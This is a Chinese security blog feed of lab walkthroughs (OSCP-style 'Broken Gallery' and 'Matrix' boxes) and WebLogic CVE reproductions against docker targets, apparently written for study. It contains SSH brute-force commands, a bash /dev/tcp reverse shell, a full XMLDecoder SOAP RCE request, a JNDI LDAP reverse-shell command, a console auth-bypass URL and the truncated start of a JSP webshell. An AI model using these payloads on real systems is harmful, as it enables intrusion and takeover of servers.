        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCP-005-Broken</title>
      <link href="/2024/08/04/OSCP-005-Broken/"/>
      <url>/2024/08/04/OSCP-005-Broken/</url>
      
        <content type="html"><![CDATA[<h1 id="Broken-Gallery"><a href="#Broken-Gallery" class="headerlink" title="Broken Gallery"></a>Broken Gallery</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><pre><code>netdiscover -r 192.168.174.0/24</code></pre><p>获得目标ip：192.168.174.176</p><h2 id="端口，服务扫描"><a href="#端口，服务扫描" class="headerlink" title="端口，服务扫描"></a>端口，服务扫描</h2><pre><code>nmap -A -p- 192.168.174.176</code></pre><p>得到22和80端口开放</p><p>下面还有另一种方法，首先通过namp生成扫描结果的文件</p><pre><code>nmap -sT -p- --min-rate 1000 192.168.174.167 -oA ./Broken_galley</code></pre><p>生成报告后，用awk去找，算是练习把</p><pre><code>cat Broken_galley.nmap | grep &quot;open&quot; | awk -F &#39;/&#39; &#39;&#123;print $1&#125;&#39; | paste -sd &#39;,&#39; 返回22，80</code></pre><pre><code>nmap -sT -sC -sV -p 22,80 192.168.174.176 -oA ./detail</code></pre><p><img src="/../image/image-20240805195444643.png" alt="image-20240805195444643"></p><p>这种带目录的扫描比较好看</p><h2 id="访问服务"><a href="#访问服务" class="headerlink" title="访问服务"></a>访问服务</h2><p><img src="/../image/image-20240804170115370.png" alt="image-20240804170115370"></p><p><img src="/../image/image-20240804170124532.png" alt="image-20240804170124532"></p><p>有一些图片，和一个readme文件，下载下来是一串16进制的字节码</p><p><img src="/../image/image-20240804174129642.png" alt="image-20240804174129642"></p><p>通过xxd还原成二进制文件</p><pre><code>xxd -r -ps README.md &gt; README.bin</code></pre><ul><li>-r选项用于将十六进制格式转换回二进制格式</li><li>-p表示输出纯粹的十六进制编码，而不包括其他信息</li><li>-s选项用于跳过文件的前N个字节</li></ul><p>通过strings来读二进制文件，通过head来读取前几行内容来确定文件类型</p><pre><code>strings README.bin | head -n 10</code></pre><p><img src="/../image/image-20240805221742308.png" alt="image-20240805221742308"></p><p>可以看到jfif头，说明这个文件是图片文件，更改为jpg后缀并打开</p><pre><code>mv README.bin README.jpg</code></pre><p><img src="/../image/image-20240805221943926.png" alt="image-20240805221943926"></p><p>应用程序是坏的的，基础设施是坏的。。。没什么思路</p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><pre><code>dirb http://192.168.174.167</code></pre><p><img src="/../image/image-20240804174231876.png" alt="image-20240804174231876"></p><p>没什么收获，估计要从图片出发，这里也提供另一种方法</p><h3 id="gobuster"><a href="#gobuster" class="headerlink" title="gobuster"></a>gobuster</h3><pre><code> gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -u http://192.168.10.111/ -x txt,rar,zip,tar,sql,php</code></pre><p>内容会更全一点，但在这里也没什么返回，后台挂着，gobuster还可以扫别的内容</p><p><img src="/../image/image-20240805195959568.png" alt="image-20240805195959568"></p><h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><pre><code>xdg-open  img_forest.jpg 查看图片的命令</code></pre><pre><code>strings *.jpg | less</code></pre><p>没什么内容</p><p>再用exiftool来看看其他图片，没有发现有隐藏的信息</p><pre><code>exiftool *.jpg</code></pre><p><img src="/../image/image-20240805222700803.png" alt="image-20240805222700803"></p><p>也有另一种方法看</p><pre><code>steghide extract -sf img_5terre.jpg</code></pre><p><img src="/../image/image-20240805222810915.png" alt="image-20240805222810915"></p><p>也没什么内容，只能从爆破ssh去测试了</p><h2 id="爆破SSH"><a href="#爆破SSH" class="headerlink" title="爆破SSH"></a>爆破SSH</h2><p>看看文件名有啥提示</p><pre><code>ls | grep .jpg | sed s/\.jpg//</code></pre><p><img src="/../image/image-20240805222931750.png" alt="image-20240805222931750"></p><p>推测应该是密码或用户名,用这个来生成一个wordlist</p><pre><code>ls | grep .jpg | sed s/\.jpg// &gt; wordlist</code></pre><p>接下来用hydra爆破测试</p><pre><code>hydra -L wordlist -P wordlist 192.168.174.176 ssh</code></pre><p>失败，去掉前缀试试</p><pre><code>cat wordlist | sed s/img_// &gt; wordlist2</code></pre><p><img src="/../image/image-20240805223326918.png" alt="image-20240805223326918"></p><p>再把broken和galley加上</p><pre><code>echo -e &quot;broken\ngalley&quot; &gt;&gt; wordlist2</code></pre><p>然后利用rsmangler工具，它首先将对所述输入字和生成的所有排列和字样的缩写（为了它们出现在文件中）完成的各种操作之前它适用的其余部分</p><p><a href="https://zing.gitbooks.io/kali-lunix/content/09x/9x29_RSMangler.html">https://zing.gitbooks.io/kali-lunix/content/09x/9x29_RSMangler.html</a></p><pre><code>rsmangler -m 6 -x 8 -r -d -e -i --punctuation -y -a -C --pna --nb --space --allow-duplicates -f wordlist2 -o mangled</code></pre><p><img src="/../image/image-20240805223812412.png" alt="image-20240805223812412"></p><p>然后进行爆破</p><pre><code>hydra -L wordlist2 -P mangled 192.168.174.176 ssh</code></pre><p><img src="/../image/image-20240805224445315.png" alt="image-20240805224445315"></p><p>也可以从另一种思路出发，根据图片手动生成字典</p><pre><code>5terreforestlightsmountainsBobBROKENbrokenavrahamacohen.ac@gmail.comavrahamcohen.acavrahamcohen</code></pre><p>通过crackmapexec进行SSH爆破</p><pre><code>#--continue-on-success:表示成功获得凭据后继续爆破#跟john相比，john更偏向快速，creackmapexec支持的协议和功能比较多sudo crackmapexec ssh 192.168.10.111 -u creds -p creds --continue-on-success</code></pre><p><img src="/../image/image-20240805224630599.png" alt="image-20240805224630599"></p><p>获得账号密码</p><pre><code>broken:broken</code></pre><p>登陆</p><pre><code>ssh broken@192.168.174.176</code></pre><p>查看可以用户环境</p><pre><code>sudo -l</code></pre><p><img src="/../image/image-20240805224641938.png" alt="image-20240805224641938"></p><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>首先查看历史命令，看看线索</p><p><img src="/../image/image-20240805224742187.png" alt="image-20240805224742187"></p><p>发现有个密码策略文件，尝试寻找一下这个文件</p><pre><code>ls -lahcat .sudo_as_admin_successfullocate password-policy.sh</code></pre><p><img src="/../image/image-20240805225010573.png" alt="image-20240805225010573"></p><p>得到路径&#x2F;etc&#x2F;init.d&#x2F;pasword-policy.sh</p><pre><code>cat /etc/init.d/password-policy.sh</code></pre><pre><code class="shell">#!/bin/bashDAYOFWEEK=$(date +&quot;%u&quot;)echo DAYOFWEEK: $DAYOFWEEKif [ &quot;$DAYOFWEEK&quot; -eq 4 ]then        sudo sh -c &#39;echo root:TodayIsAgoodDay | chpasswd&#39;fi#if [ &quot;$DAYOFWEEK&quot; == 4 ]</code></pre><p>这段脚本是一个简单的 Bash 脚本，用于检查当前是星期几，并在星期四时更改 root 用户的密码。下面是脚本的逐行解释：</p><ol><li><code>#!/bin/bash</code>：这是一个 shebang 行，告诉系统这个脚本应该使用哪个解释器来执行，这里是 Bash。</li><li><code>DAYOFWEEK=$(date +&quot;%u&quot;)</code>：这行命令使用 <code>date</code> 命令获取当前的星期数（星期一为 1，星期日为 7），并将其存储在变量 <code>DAYOFWEEK</code> 中。</li><li><code>echo DAYOFWEEK: $DAYOFWEEK</code>：这行打印出当前的星期数。</li><li><code>if [ &quot;$DAYOFWEEK&quot; -eq 4 ]</code>：这是一个条件语句，检查 <code>DAYOFWEEK</code> 是否等于 4（星期四）。</li><li><code>then</code>：如果条件为真（即当前是星期四），则执行下面的命令。</li><li><code>sudo sh -c &#39;echo root:TodayIsAgoodDay | chpasswd&#39;</code>：这行命令使用 <code>sudo</code> 以超级用户权限执行 <code>sh -c</code>，然后通过管道将 <code>echo</code> 命令的输出传递给 <code>chpasswd</code> 命令，从而更改 root 用户的密码为 “TodayIsAgoodDay”。</li><li><code>fi</code>：结束 if 语句。</li></ol><p>注释掉的 <code>#if [ &quot;$DAYOFWEEK&quot; == 4 ]</code> 行是另一种写法，使用 <code>==</code> 进行字符串比较，但由于 <code>DAYOFWEEK</code> 是一个数字，所以应该使用 <code>-eq</code> 来进行数值比较。</p><p>为了测试，我们改成周一的版本,我们先通过下面的方法改一下脚本，再来reboot</p><pre><code>date +&quot;%u&quot;</code></pre><p><img src="/../image/image-20240805230412615.png" alt="image-20240805230412615"></p><pre><code>cat /etc/init.d/password-policy.sh</code></pre><pre><code class="shell">#!/bin/bashDAYOFWEEK=$(date +&quot;%u&quot;)echo DAYOFWEEK: $DAYOFWEEKif [ &quot;$DAYOFWEEK&quot; -eq 1 ]then        sudo sh -c &#39;echo root:TodayIsAgoodDay | chpasswd&#39;fi#if [ &quot;$DAYOFWEEK&quot; == 4 ] </code></pre><pre><code>sudo reboot</code></pre><p><img src="/../image/image-20240805230552620.png" alt="image-20240805230552620"></p><pre><code>ssh root@192.168.174.176</code></pre><p>记得用broken连上再su root</p><p><img src="/../image/image-20240805230751633.png" alt="image-20240805230751633"></p><h2 id="timedatectl提权"><a href="#timedatectl提权" class="headerlink" title="timedatectl提权"></a>timedatectl提权</h2><p><img src="/../image/image-20240805225707696.png" alt="image-20240805225707696"></p><p>前面我们看到broken用户还可以执行timedatectl命令</p><p>通过gtfobins：<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> 来查看对应的提权方法</p><p><img src="/../image/image-20240805225855524.png" alt="image-20240805225855524"></p><pre><code>sudo timedatectl list-timezones</code></pre><p><img src="/../image/image-20240805230037506.png" alt="image-20240805230037506"></p>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSCP-004-Matrix</title>
      <link href="/2024/08/01/OSCP-004-Matrix/"/>
      <url>/2024/08/01/OSCP-004-Matrix/</url>
      
        <content type="html"><![CDATA[<h1 id="OSCP-004-Matrix"><a href="#OSCP-004-Matrix" class="headerlink" title="OSCP-004-Matrix"></a>OSCP-004-Matrix</h1><p>调整为nat模式</p><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><pre><code>netdiscover -r 192.168.174.0/24</code></pre><p><img src="/../image/image-20240801202833123.png" alt="image-20240801202833123"></p><h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><pre><code>nmap -p- -T5 192.168.174.161</code></pre><p><img src="/../image/image-20240801202919969.png" alt="image-20240801202919969"></p><pre><code>nmap -p80,6464,7331 -sV --script &quot;default, safe&quot; (IP)</code></pre><p>可以获得的信息<br>80和7331都是python起的http服务</p><p>6464是一个ssh的端口</p><h2 id="访问服务"><a href="#访问服务" class="headerlink" title="访问服务"></a>访问服务</h2><p>80端口</p><p><img src="/../image/image-20240801203406539.png" alt="image-20240801203406539"></p><p>7331端口：一个登陆界面</p><p><img src="/../image/image-20240801203544739.png" alt="image-20240801203544739"></p><p>输入admin:admin后，有个显示，传入后台应该是base64</p><pre><code>echo &quot;YWRtaW46YWRtaW4=&quot; | base64 -d</code></pre><p>admin:admin</p><h2 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h2><pre><code>dirb http://192.168.174.161</code></pre><p><img src="/../image/image-20240802094342918.png" alt="image-20240802094342918"></p><p>访问该目录</p><p><img src="/../image/image-20240802094413249.png" alt="image-20240802094413249"></p><p>可以在img里找到一个rabbit的图片</p><p><img src="/../image/image-20240802094440273.png" alt="image-20240802094440273"></p><p>下载下来试试</p><pre><code>wget http://192.168.174.161/assets/img/Matrix_can-show-you-the-door.png</code></pre><p>官方文档是</p><pre><code>strings xx.pngzsteg -a xx.png</code></pre><p>用这两个命令看下图片有没有隐写信息，没什么收获</p><p>可以发现图片名提示Matrix提供这个门，尝试访问Matrix目录</p><p><img src="/../image/image-20240802185608055.png" alt="image-20240802185608055"></p><p>发现一串目录，在<code>Matrix/n/e/o/6/4/</code>目录下发现一个<code>secret.gz</code>文件，应该是一个提示，也可以发现是黑客帝国得尼奥得英文名</p><p><img src="/../image/image-20240802185905833.png" alt="image-20240802185905833"></p><h2 id="文件分析"><a href="#文件分析" class="headerlink" title="文件分析"></a>文件分析</h2><p>下载下来试试</p><pre><code>wget http://192.168.174.161/Matrix/n/e/o/6/4/secret.gz</code></pre><p>gunzip试了下，不是gzip文件</p><p>file查看一下，发现是ascii：text文件</p><p>直接cat查看</p><pre><code>admin:76a2173be6393254e72ffa4d6df1030a</code></pre><p>查下md5</p><p><img src="/../image/image-20240802191003458.png" alt="image-20240802191003458"></p><p>也可以不查</p><pre><code>echo &quot;xxx&quot; &gt; hashjohn --show --format=Raw-MD5 hash</code></pre><p>可以得到admin:passwd</p><h2 id="登陆页面目录扫描"><a href="#登陆页面目录扫描" class="headerlink" title="登陆页面目录扫描"></a>登陆页面目录扫描</h2><pre><code>dirb http://192.168.174.161:7331 -u admin:passwd</code></pre><p><img src="/../image/image-20240802191437778.png" alt="image-20240802191437778"></p><p>发现data目录和robots.txt文件，分别访问</p><p><img src="/../image/image-20240802191515914.png" alt="image-20240802191515914"></p><p><img src="/../image/image-20240802191526369.png" alt="image-20240802191526369"></p><p>可以发现一个data文件，下载尝试分析文件</p><pre><code>wget http://ip:7331/data/data --user admin --password passwd</code></pre><pre><code>file dataPE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections</code></pre><p>是一个PE文件，放到ida里反编译一下</p><p><img src="/../image/image-20240802195504521.png" alt="image-20240802195504521"></p><pre><code>guest:7R1n17yN30</code></pre><p>可以在dispose中找到一个账号密码对，结合剩下一个的ssh端口，推测是用该账号密码连接</p><h2 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h2><pre><code>ssh guest@192.168.174.161 -p6464</code></pre><p>连上后，发现很多指令都用不了</p><pre><code>echo $SHELL</code></pre><p>发现是rbash，尝试连接默认shell</p><p><img src="/../image/image-20240802200900060.png" alt="image-20240802200900060"></p><pre><code>ssh guest@192.168.174.161 -p6464 -t &quot;bash --noprofile&quot;</code></pre><ul><li><code>&quot;bash --noprofile&quot;</code> 是在远程计算机上执行的命令。<code>bash</code> 是Bourne Again Shell的简称，是一种常用的Unix shell。<code>--noprofile</code> 选项告诉bash不要读取用户的profile文件，这在某些情况下可以防止执行一些可能不安全的脚本。</li></ul><p>再次echo shell,虽然说还是rbash但还是可以执行其它命令的，我们可以创建一个空的ssh的rsa密钥</p><p><img src="/../image/image-20240802200926473.png" alt="image-20240802200926473"></p><p>这个用户可以不用密码利用root身份去运行一个特定的文件。利用trinity这个用户身份还可以执行cp命令，看来这是突破口了。</p><p>利用cp将bash复制到root可以执行的文件位置，失败</p><p><img src="/../image/image-20240802201338624.png" alt="image-20240802201338624"></p><p>vi提权</p><pre><code>vi:!/bin/shexport PATH=&quot;/usr/bin&quot;/usr.bin/bash</code></pre><p>find一下有没有提权的文件</p><pre><code>find / -perm -4000 2&gt;/dev/null</code></pre><p><img src="/../image/image-20240802202925298.png" alt="image-20240802202925298"></p><p>利用ssh-keygen生成一个密钥，准备给trinity用。</p><p><img src="/../image/image-20240802201425373.png" alt="image-20240802201425373"></p><p>查看一下sshd的配置文件，可以看到开着pubkey认证，并且密钥保存在.ssh&#x2F;authorized_keys，下一步就把我们生成的密钥放到trinity用户目录下就行了。</p><pre><code>cat /etc/ssh/sshd_config</code></pre><p><img src="/../image/image-20240802201638580.png" alt="image-20240802201638580"></p><p>把刚生成的id_rsa.pub权限修改为777，让非guest的用户也有执行权限，然后利用trinity身份的cp命令将这个文件复制到trinity&#x2F;.ssh&#x2F;authorized_keys</p><pre><code>chmod 777 id_rsa.pubchmod 777 .sshsudo -u trinity /bin/cp .ssh/id_rsa.pub  /home/trinity/.ssh/authorized_keys</code></pre><p>再ssh登陆trinity</p><pre><code>ssh trinity@127.0.0.1 -i .ssh/id_rsa.pub -p 6464sudo -l</code></pre><p><img src="/../image/image-20240802204428518.png" alt="image-20240802204428518"></p><p>登录trinity用户发现可以以root用户权限无密码使用<code>oracle</code>命令，直接将<code>/usr/bin/bash</code>复制到<code>trinity家目录</code>下并改名为<code>oracle</code></p><pre><code>cp /usr/bin/bash oraclechmod +x oracle</code></pre><p><img src="/../image/image-20240802204506245.png" alt="image-20240802204506245"></p><p>调用oracle，成功拥有root权限，在root目录下找到flag.txt文件</p><pre><code>sudo ./oracle cd /root/cat flag.txt</code></pre><p><img src="/../image/image-20240802204640441.png" alt="image-20240802204640441"></p>]]></content>
      
      
      
        <tags>
            
            <tag> OSCP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>weblogic</title>
      <link href="/2024/07/23/weblogic/"/>
      <url>/2024/07/23/weblogic/</url>
      
        <content type="html"><![CDATA[<h1 id="Weblogic"><a href="#Weblogic" class="headerlink" title="Weblogic"></a>Weblogic</h1><h2 id="简要介绍"><a href="#简要介绍" class="headerlink" title="简要介绍"></a>简要介绍</h2><p><a href="https://blog.csdn.net/rumil/article/details/133036788">https://blog.csdn.net/rumil/article/details/133036788</a></p><p><a href="https://www.freebuf.com/articles/web/372568.html">https://www.freebuf.com/articles/web/372568.html</a></p><p>Weblogic Server中的RMI 通信使用T3协议在Weblogic Server和其它Java程序（客户端或者其它Weblogic Server实例）之间传输数据, 服务器实例会跟踪连接到应用程序的每个Java虚拟机（JVM）中, 并创建T3协议通信连接, 将流量传输到Java虚拟机。T3协议在开放WebLogic控制台端口的应用上默认开启。攻击者可以通过T3协议发送恶意的的反序列化数据, 进行反序列化, 实现对存在漏洞的weblogic组件的远程代码执行攻击（开放Weblogic控制台的7001端口，默认会开启T3协议服务，T3协议触发的Weblogic Server WLS Core Components中存在反序列化漏洞，攻击者可以发送构造的恶意T3协议数据，获取目标服务器权限。）</p><p>T3协议缺陷实现了Java虚拟机的远程方法调用（RMI）,能够在本地虚拟机上调用远端代码。</p><p><strong>T3协议：</strong></p><p>用于在Weblogic服务器和其他类型的Java程序之间传输信息的协议。Weblogic会跟踪连接到应用程序的每个Java虚拟机，要将流量传输到Java虚拟机，Weblogic会创建一个T3连接。该链接会通过消除在网络之间的多个协议来最大化效率，从而使用较少的操作系统资源。用于T3连接的协议还可以最大限度减少数据包大小，提高传输速度。</p><p><strong>RMI方法：</strong></p><p>远程方法调用，除了该对象本身的虚拟机，其它的虚拟机也可以调用该对象的方法。（对象的虚拟化和反序列化广泛应用到RMI和网络传输中）</p><p><strong>JRMP：</strong></p><p>Java远程消息交换协议JRMP。</p><p>JRMP是一个Java远程方法协议，该协议基于TCP&#x2F;IP之上，RMI协议之下。也就是说RMI该协议传递时底层使用的是JRMP协议，而JRMP底层则是基于TCP传递。</p><p>RMI默认使用的JRMP进行传递数据，并且JRMP协议只能作用于RMI协议。当然RMI支持的协议除了JRMP还有IIOP协议，而在Weblogic里面的T3协议其实也是基于RMI去进行实现的。</p><h2 id="CVE-2017-10271"><a href="#CVE-2017-10271" class="headerlink" title="CVE-2017-10271"></a>CVE-2017-10271</h2><p>简要介绍：<a href="https://www.cnblogs.com/chen-w/p/14652153.html">https://www.cnblogs.com/chen-w/p/14652153.html</a></p><h3 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>首先使用docker起一个weblogic CVE-2017-1027的环境，进入到vulhub&#x2F;weblogic&#x2F;CVE-2017-1027</p><pre><code class="dockerfile">docker-compose up -d</code></pre><p>启动成功后</p><p><img src="/../image/image-20240716213102663.png" alt="image-20240716213102663"></p><pre><code class="docker">docker ps -a</code></pre><p>查看运行状态</p><p><img src="/../image/image-20240716213125924.png" alt="image-20240716213125924"></p><p>接着去访问本机的7001端口，出现如下页面，说明服务成功开启：</p><p><img src="/../image/image-20240716214217994.png" alt="image-20240716214217994"></p><p>访问&#x2F;wls-wsat&#x2F;CoordinatorPortType</p><p><img src="/../image/image-20240716214533663.png" alt="image-20240716214533663"></p><p>可以先扫一下服务</p><pre><code>nmap -sV 192.168.174.137</code></pre><p><img src="/../image/image-20240716222238125.png" alt="image-20240716222238125"></p><p>用相关漏洞的扫描工具也可以</p><p><img src="/../image/image-20240716222344082.png" alt="image-20240716222344082"></p><h3 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="漏洞poc"></a>漏洞poc</h3><pre><code class="shell">bash -i &gt;&amp; /dev/tcp/vpsip/ncport 0&gt;&amp;1</code></pre><p><img src="/../image/image-20240718205520947.png" alt="image-20240718205520947"></p><p>能弹啊，docker为什么弹不了，还要配置网卡吗</p><p>发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）：</p><pre><code>POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.1.15:7001Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: text/xmlContent-Length: 637&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;&lt;void index=&quot;0&quot;&gt;&lt;string&gt;/bin/bash&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;1&quot;&gt;&lt;string&gt;-c&lt;/string&gt;&lt;/void&gt;&lt;void index=&quot;2&quot;&gt;&lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.174.137/888 0&amp;gt;&amp;amp;1&lt;/string&gt;&lt;/void&gt;&lt;/array&gt;&lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;&lt;/java&gt;&lt;/work:WorkContext&gt;&lt;/soapenv:Header&gt;&lt;soapenv:Body/&gt;&lt;/soapenv:Envelope&gt;12345678910111213141516171819202122232425262728293031</code></pre><h2 id="CVE-2023-21839"><a href="#CVE-2023-21839" class="headerlink" title="CVE-2023-21839"></a>CVE-2023-21839</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Weblogic 允许远程用户在未经授权的情况下通过IIOP&#x2F;T3进行JNDI lookup 操作，当JDK版本过低或本地存在javaSerializedData时，这可能会导致RCE漏洞。</p><p>WebLogic 存在远程代码执行漏洞（CVE-2023-21839&#x2F;CNVD-2023-04389），由于Weblogic IIOP&#x2F;T3协议存在缺陷，当IIOP&#x2F;T3协议开启时，允许未经身份验证的攻击者通过IIOP&#x2F;T3协议网络访问攻击存在安全风险的WebLogic Server，漏洞利用成功WebLogic Server可能被攻击者接管执行任意命令导致服务器沦陷或者造成严重的敏感数据泄露。</p><h3 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h3><p>WebLogic_Server &#x3D; 12.2.1.3.0<br>WebLogic_Server &#x3D; 12.2.1.4.0<br>WebLogic_Server &#x3D; 14.1.1.0.0<br><strong>CVE-2023-21839是一个weblogic的JNDI注入漏洞。</strong></p><p>由于Weblogic t3&#x2F;iiop协议支持远程绑定对象bind到服务端，并且可以通过lookup查看，当远程对象继承自OpaqueReference时，lookup查看远程对象，服务端会调用远程对象getReferent方法。weblogic.deployment.jms.ForeignOpaqueReference继承自OpaqueReference并且实现了getReferent方法，并且存在retVal &#x3D; context.lookup(this.remoteJNDIName)实现，故可以通过rmi&#x2F;ldap远程协议进行远程命令执行。</p><h3 id="环境搭建（最难的是找对应版本的jndi工具，还是自己理解合适，自己根据原理搭一个，但java不熟悉QAQ）"><a href="#环境搭建（最难的是找对应版本的jndi工具，还是自己理解合适，自己根据原理搭一个，但java不熟悉QAQ）" class="headerlink" title="环境搭建（最难的是找对应版本的jndi工具，还是自己理解合适，自己根据原理搭一个，但java不熟悉QAQ）"></a>环境搭建（最难的是找对应版本的jndi工具，还是自己理解合适，自己根据原理搭一个，但java不熟悉QAQ）</h3><p><img src="/../image/image-20240717095001438.png" alt="image-20240717095001438"></p><p>访问靶场地址：</p><p><img src="/../image/image-20240717095020526.png" alt="image-20240717095020526"></p><p>Nmap扫描：</p><pre><code>nmap -sV 192.168.174.137</code></pre><p><img src="/../image/image-20240717095129769.png" alt="image-20240717095129769"></p><p>扫描验证T3是否开启：</p><pre><code>nmap -n -v -p 7001,7002 192.168.174.137 --script=weblogic-t3-info</code></pre><p><img src="/../image/image-20240717095226815.png" alt="image-20240717095226815"></p><p>开启LDAP和HTTP服务</p><pre><code>ava -jar JNDIExploit-1.2-SNAPSHOT.jar -i 192.168.174.137//攻击者ip</code></pre><p><img src="/../image/image-20240717224640807.png" alt="image-20240717224640807"></p><p>监听端口（用于接收反弹的shell）</p><pre><code>nc -lvvp 9999</code></pre><p><img src="/../image/image-20240717224800690.png" alt="image-20240717224800690"></p><p>使用工具包</p><p>j教程使用的：<a href="https://github.com/ASkyeye/CVE-2023-21839">GitHub - ASkyeye&#x2F;CVE-2023-21839: Weblogic CVE-2023-21839 RCE (无需Java依赖一键RCE)</a></p><p>这个下载下来要在linux环境下编译，windows下编译了好像不行用，不懂是什么问题</p><pre><code>./CVE-2023-21839 -ip 192.168.174.137 -port 7001 -ldap ldap://192.168.174.137:1389/Basic/ReverseShell/192.168.174.137/9999</code></pre><p>因为担心docker在虚拟机nat不通就没在外面测试了</p><p><img src="/../image/image-20240717225351922.png" alt="image-20240717225351922"></p><p>最后也是成功反弹shell了，这个java的漏洞的环境太难搭了</p><p>成功复现，记得关闭docker启动的镜像</p><p>关闭镜像</p><pre><code>docker-compose stop</code></pre><p>因为docker-compose up -d也是拉镜像启动，所以本地会有镜像保留，有些还挺大的，不需要的话可以删了</p><pre><code>docker imagesdocker rmi -f 镜像id</code></pre><h2 id="CVE-2020-14750"><a href="#CVE-2020-14750" class="headerlink" title="CVE-2020-14750"></a>CVE-2020-14750</h2><p><a href="https://cloud.tencent.com/developer/article/2168616">https://cloud.tencent.com/developer/article/2168616</a></p><h4 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h4><p><strong>- WebLogic Console权限认证绕过漏洞（CVE-2020-14750） -</strong> </p><p>Weblogic Server是Oracle公司的一款适用于云环境和传统环境的应用<a href="https://cloud.tencent.com/act/pro/promotion-cvm?from_column=20065&from=20065">服务器</a>，它提供了一个现代轻型开发平台，支持应用从开发到生产的整个生命周期管理，并简化了应用的部署和管理。Oracle官方在2020年10月发布了关键补丁更新公告，其中包括一个CVE-2020-14750为 WebLogic Console权限认证绕过的漏洞CVE-2020-14882补丁的绕过漏洞，CVSS 评分 9.8 分。CVE-2020-14882 补丁被绕过后，攻击者就可以再度绕过Console控制台的权限校验，访问原本需要登录才可以访问的资源和接口功能。尽管 CVE-2020-14883 这个后台的任意代码执行漏洞已被修复，但攻击者依然可以通过寻找利用其他合适的后台接口漏洞，实现远程代码执行，从而获取服务器权限。</p><p>影响版本：</p><ul><li>Oracle WebLogic Server 10.3.6.0.0</li><li>Oracle WebLogic Server 12.1.3.0.0</li><li>Oracle WebLogic Server 12.2.1.3.0</li><li>Oracle WebLogic Server 12.2.1.4.0</li><li>Oracle WebLogic Server 14.1.1.0.0</li></ul><h4 id="0x03-漏洞验证"><a href="#0x03-漏洞验证" class="headerlink" title="0x03 漏洞验证"></a>0x03 漏洞验证</h4><p>使用<a href="https://cloud.tencent.com/developer/tools/blog-entry?target=https://github.com/0xn0ne/WeblogicScanner&source=article&objectId=2168616">WeblogicScaner</a>工具检测目标网站存在CVE-2020-14750漏洞。</p><pre><code>python3 ws.py -t http://172.16.14.149:7001 -v CVE-2020-14750</code></pre><p>构造特殊URL地址绕过WebLogic Console控制台权限进行访问：</p><p><img src="/../image/image-20240718114246101.png" alt="image-20240718114246101"></p><p><img src="/../image/image-20240718114220535.png" alt="image-20240718114220535"></p><pre><code>http://172.16.14.149:7001/console/css/%25%32%65%25%32%65%25%32%66/console.portal</code></pre><p><img src="/../image/image-20240718114153961.png" alt="image-20240718114153961"></p><h2 id="CVE-2018-2894"><a href="#CVE-2018-2894" class="headerlink" title="CVE-2018-2894"></a>CVE-2018-2894</h2><p><a href="https://blog.csdn.net/weixin_51198941/article/details/134193310">https://blog.csdn.net/weixin_51198941/article/details/134193310</a></p><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>WebLogic管理端未授权的两个页面存在任意上传getshell漏洞，可直接获取权限。两个页面分别为&#x2F;ws_utc&#x2F;begin.do，&#x2F;ws_utc&#x2F;config.do</p><p>这里进后台的部分借用前面的漏洞</p><p>访问漏洞页面（需要手动设置一下环境设置Work Home Dir为，&#x2F;u01&#x2F;oracle&#x2F;user_projects&#x2F;domains&#x2F;base_domain&#x2F;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;com.oracle.webservices.wls.ws-testclient-app-wls&#x2F;4mcj4y&#x2F;war&#x2F;css)</p><pre><code>http://172.16.14.149:7001/ws_utc/config.do</code></pre><p><img src="/../image/image-20240718123446376.png" alt="image-20240718123446376"></p><p>点击安全 -&gt; 添加，名字和密码可以随意设置，上传jsp木马文件（登录密码为fafa）；</p><pre><code class="jsp">&lt;%!    class U extends ClassLoader &#123;        U(ClassLoader c) &#123;            super(c);        &#125;        public Class g(byte[] b) &#123;            return super.defineClass(b, 0, b.length);        &#125;    &#125;     public byte[] 